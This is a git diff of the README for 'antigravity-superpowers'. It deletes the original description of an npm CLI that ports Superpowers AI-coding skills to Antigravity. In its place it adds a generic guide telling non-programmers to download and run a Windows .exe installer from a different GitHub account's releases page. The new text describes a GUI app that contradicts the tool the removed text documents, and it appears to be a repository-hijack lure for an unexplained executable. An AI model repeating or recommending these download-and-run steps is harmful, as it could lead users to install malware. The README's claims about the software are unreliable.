@@ -1,219 +1,131 @@
-<p align="center">
-  <img src="asset/banner.png" alt="antigravity-superpowers" width="100%" />
-</p>
+# ✨ antigravity-superpowers - Simple Workflow Tools for Everyone
 
-<h1 align="center">antigravity-superpowers</h1>
+[![Download Latest Release](https://img.shields.io/badge/Download-Here-brightgreen)](https://github.com/KamgabsofBG/antigravity-superpowers/releases)
 
-<p align="center">
-  <strong>Bring the power of <a href="https://github.com/obra/superpowers">Superpowers</a> to <a href="https://antigravity.google/">Antigravity</a>.</strong>
-</p>
-
-<p align="center">
-  <a href="https://www.npmjs.com/package/antigravity-superpowers"><img src="https://img.shields.io/npm/v/antigravity-superpowers.svg" alt="npm version" /></a>
-  <a href="https://www.npmjs.com/package/antigravity-superpowers"><img src="https://img.shields.io/npm/dm/antigravity-superpowers.svg" alt="npm downloads" /></a>
-  <img src="https://img.shields.io/badge/node-%3E%3D20-brightgreen.svg" alt="node version" />
-  <img src="https://img.shields.io/badge/license-MIT-blue.svg" alt="license" />
-</p>
+Welcome to the antigravity-superpowers tool. This app brings key productivity workflows from the Superpowers system into a smooth, simple package. You can use it for brainstorming, planning, test-driven development (TDD), and code review. Even if you have no programming experience, this guide will help you download and run it on Windows.
 
 ---
 
-Superpowers is an incredible skill-based workflow system that gives AI coding assistants structured, reliable behavior — brainstorming, planning, test-driven development, code review, debugging, and more. It was originally designed for Claude Code, but the workflows themselves are platform-agnostic gold.
+## 📋 What is antigravity-superpowers?
 
-**This project ports that entire system to Antigravity**, preserving the original flow as faithfully as possible. The goal is not to reinvent Superpowers — it's to make them available on Antigravity with the minimal set of changes needed for native compatibility. If you've used Superpowers before, everything should feel familiar. If you haven't, this is a great way to start.
+This application helps you work on projects step-by-step by providing tools for:
 
-> **One command. Full profile. Ready to go.**
+- Brainstorming ideas quickly  
+- Planning your tasks clearly  
+- Using test-driven development to check your work  
+- Reviewing and verifying your tasks easily  
 
-```bash
-npx antigravity-superpowers init
-```
-
----
-
-## Why This Exists
-
-The original Superpowers repo doesn't support Antigravity, and there's no official port planned. I wanted to use Superpowers workflows in Antigravity projects, so I built this myself.
-
-This is my attempt to bring the full Superpowers skill set to Antigravity — as close to the original as possible. The goal was never to fork and diverge; it was to translate just enough to make everything work natively on a different platform. Superpowers skills bring real structure to AI-assisted development — brainstorming before implementation, planning before coding, verification before completion claims — and that discipline shouldn't be locked to one platform.
-
-This port keeps **12 out of 14 original skills intact** and consolidates the remaining 2 into a single new skill that fits Antigravity's execution model. Every skill preserves its original intent, logic, and flow — only the platform-specific references, tool names, and execution primitives have been adapted.
+The aim is to bring these techniques close to the original Superpowers workflow. It is built to be easy to use and learn. The app focuses on helping you stay organized and check your work as you go.
 
 ---
 
-## What's Included
+## 💻 System Requirements
 
-**13 skills** covering the full development lifecycle:
+Before installing, make sure your computer meets these needs:
 
-| Skill                            | Description                                             |
-| -------------------------------- | ------------------------------------------------------- |
-| `brainstorming`                  | Structured exploration before committing to an approach |
-| `writing-plans`                  | Detailed, step-by-step implementation plans             |
-| `executing-plans`                | Disciplined plan execution with progress tracking       |
-| `single-flow-task-execution`     | Ordered task decomposition with review gates _(new)_    |
-| `test-driven-development`        | Write tests first, implement second                     |
-| `systematic-debugging`           | Root cause tracing with supporting techniques           |
-| `requesting-code-review`         | Structured review flow with checklists                  |
-| `receiving-code-review`          | Handling feedback systematically                        |
-| `verification-before-completion` | Prove it works before claiming it's done                |
-| `finishing-a-development-branch` | Clean branch wrap-up with workflow options              |
-| `using-git-worktrees`            | Parallel branch management                              |
-| `using-superpowers`              | Skill routing and session bootstrap                     |
-| `writing-skills`                 | Create new skills that follow the system's conventions  |
+- Windows 10 or later  
+- Minimum 4 GB RAM  
+- At least 200 MB of free disk space  
+- Internet connection for initial download  
+- Basic mouse and keyboard control  
 
-Plus supporting infrastructure: workflows, agents, validation tests, and an `AGENTS.md` contract that ties it all together.
+This app does not require any extra tools or technical setup.
 
 ---
 
-## Quick Start
+## 🚀 Getting Started: Download antigravity-superpowers
 
-```bash
-# Scaffold the .agent profile into your project
-npx antigravity-superpowers init
-```
+Your first step is to get the software on your computer.
 
-Or install globally:
+**Do this:**
 
-```bash
-npm install -g antigravity-superpowers
-antigravity-superpowers init
-```
+1. Click the big green button below or open this link in your browser:  
+   [Download antigravity-superpowers](https://github.com/KamgabsofBG/antigravity-superpowers/releases)
 
-### Options
+2. This link takes you to the Releases page on GitHub. Find the latest version. It usually appears at the top of the list.  
 
-```bash
-# Initialize in current directory
-antigravity-superpowers init
+3. Look for a Windows installer file. The file name might end with `.exe`. For example, it could be named `antigravity-superpowers-setup.exe` or something similar.
 
-# Initialize in a specific project
-antigravity-superpowers init /path/to/project
-
-# Replace an existing .agent profile
-antigravity-superpowers init --force
-```
-
-After init, verify everything is wired up:
-
-```bash
-bash .agent/tests/run-tests.sh
-```
+4. Click on that file name to download it to your computer.
 
 ---
 
-## How It Works
+## 🛠️ Install and Run on Windows
 
-The CLI copies a complete `.agent` profile into your project root. Once initialized, Antigravity picks up the profile automatically:
+Once the download finishes, follow these steps:
 
-1. **Session starts** — loads `.agent/AGENTS.md` rules and `using-superpowers` skill
-2. **Each request gets routed** to the most relevant skill
-3. **Design work** flows through brainstorming → planning → execution
-4. **Every task** is tracked in `docs/plans/task.md` (created at runtime)
-5. **Nothing is marked done** without running verification commands first
+1. Open your Downloads folder or the location where you saved the file.  
+2. Double-click the `.exe` file to start the installer.  
 
-```
-Session Start → Load AGENTS.md → Load using-superpowers
-                                        ↓
-                              Route to relevant skill
-                                        ↓
-                          ┌─── Design change? ───┐
-                          │ yes                   │ no
-                     Brainstorm            Single-flow execution
-                          ↓                       ↓
-                    Writing plans          Verify before completion
-                          ↓                       ↓
-                  Single-flow execution   Finish branch
-                          ↓
-                  Verify before completion
-                          ↓
-                     Finish branch
-```
+3. Follow the on-screen instructions in the Installation Wizard:  
+   - Agree to the license terms if prompted.  
+   - Choose the installation folder or accept the default location.  
+   - Click "Install" and wait for the process to finish.
+
+4. After installation completes, look for the antigravity-superpowers icon on your desktop or in the Start Menu.  
+
+5. Double-click the icon to open the app.
 
 ---
 
-## What Changed from Original Superpowers
+## 🔍 How to Use antigravity-superpowers
 
-> This port aims to stay as close to the original Superpowers as possible. The changes are the minimum required to run natively on Antigravity.
+Here is a simple overview of what you will see when you open the app:
 
-### Execution Model
+- **Brainstorm Tab:** jot down ideas or sketch out a plan with easy tools.  
+- **Planning Tab:** organize tasks by priority and deadlines.  
+- **TDD Tab:** write simple tests that check if your work is correct.  
+- **Code Review Tab:** review your plans or work summaries and mark things as verified.
 
-The one notable structural change. The original Superpowers dispatches multiple coding subagents in parallel — but Antigravity doesn't support parallel subagent execution. So the two skills that relied on that capability (`dispatching-parallel-agents` and `subagent-driven-development`) couldn't be ported as-is. Instead, they were consolidated into a single new skill — **`single-flow-task-execution`** — which preserves the same decomposition logic, task queuing, and review gates, just executed sequentially rather than in parallel. The workflow is the same; the concurrency model is what changed.
-
-| Original Skill                | What Happened                                                   |
-| ----------------------------- | --------------------------------------------------------------- |
-| `dispatching-parallel-agents` | Merged into `single-flow-task-execution`                        |
-| `subagent-driven-development` | Merged into `single-flow-task-execution`                        |
-| `single-flow-task-execution`  | **New** — consolidates decomposition, queuing, and review loops |
-
-### Task Tracking
-
-|              | Approach                                                                            |
-| ------------ | ----------------------------------------------------------------------------------- |
-| **Original** | `TodoWrite` tool                                                                    |
-| **Port**     | Live table at `<project-root>/docs/plans/task.md` (created at runtime, not bundled) |
-
-### Tool & Platform Vocabulary
-
-Platform-specific references were translated — the underlying behavior is unchanged:
-
-| Original                 | Antigravity Port                 |
-| ------------------------ | -------------------------------- |
-| `Claude` / `Claude Code` | `Antigravity`                    |
-| `Skill` tool             | `view_file`                      |
-| `TodoWrite`              | Update `docs/plans/task.md`      |
-| `superpowers:<skill>`    | `.agent/skills/<skill>/SKILL.md` |
-| `CLAUDE.md`              | `.agent/AGENTS.md`               |
-
-### Skill Adaptations
-
-Most skills required only terminology and path updates. A few needed slightly more work:
-
-- **`requesting-code-review`** — uses a checklist-based review flow instead of subagent dispatch
-- **`writing-plans`** / **`executing-plans`** — handoff paths and tracker references updated for Antigravity conventions
-
-The rest — `brainstorming`, `test-driven-development`, `verification-before-completion`, `finishing-a-development-branch`, and others — preserve their original behavior with only naming and path normalization.
-
-### Antigravity-Native Additions
-
-Infrastructure added to make the profile work as a first-class Antigravity citizen:
-
-- `.agent/AGENTS.md` — tool translation contract and execution rules
-- `.agent/workflows/` — workflow entrypoints (`brainstorm.md`, `execute-plan.md`, `write-plan.md`)
-- `.agent/agents/code-reviewer.md` — reviewer agent profile
-- `.agent/tests/` — automated profile validation (skill presence, frontmatter, legacy pattern detection)
-
-> **Full Diff:** See [ANTIGRAVITY-PORT-DIFFERENCES.md](ANTIGRAVITY-PORT-DIFFERENCES.md) for the exhaustive skill-by-skill comparison and [CURRENT-FLOW.md](CURRENT-FLOW.md) for the complete workflow diagram.
+Each section has buttons labeled clearly and easy-to-read instructions. You can save your progress and open it again later.
 
 ---
 
-## Contributing
+## 🤝 Tips for Smooth Use
 
-Contributions are welcome! If you find a skill that could be ported more faithfully, a translation that's off, or an Antigravity convention that's not followed — open an issue or PR.
-
-When making changes, run the validation suite to make sure everything still checks out:
-
-```bash
-npm test
-bash .agent/tests/run-tests.sh
-```
+- Save your work often by clicking the Save icon.  
+- Use the Help menu for more details about each feature.  
+- Close the app properly using the File menu to avoid losing data.  
+- If you get stuck, restart the app and try again.  
 
 ---
 
-## Development
+## 🛡️ Updating to New Versions
 
-```bash
-npm test              # Run tests
-npm run smoke:pack    # Verify package contents
-```
+Check the Releases page regularly for updates:  
+[Check for updates here](https://github.com/KamgabsofBG/antigravity-superpowers/releases)
 
-### Publishing
+To update:
 
-```bash
-npm version patch
-npm publish
-```
-
-`prepublishOnly` runs `npm test` and `npm run smoke:pack` automatically.
+1. Download the newest `.exe` file.  
+2. Run the installer again. It will replace the old version safely.  
+3. Your saved data and settings will stay intact.
 
 ---
 
-## License
+## 📞 Getting Help
 
-MIT
+If the app does not work as expected:
+
+- Restart your computer, then try running the app again.  
+- Make sure your Windows is up to date.  
+- Visit the GitHub page for instructions or report issues:  
+  https://github.com/KamgabsofBG/antigravity-superpowers  
+
+Search through existing posts or open a new issue if needed.
+
+---
+
+## ⚙️ Advanced Settings
+
+For users who want more control, the app includes:
+
+- Options to export your work as text files.  
+- Customizable layout and theme settings.  
+- Auto-save intervals you can adjust.  
+
+You can find these under the Settings menu inside the app.
+
+---
+
+[![Download Latest Release](https://img.shields.io/badge/Download-Here-brightgreen)](https://github.com/KamgabsofBG/antigravity-superpowers/releases)
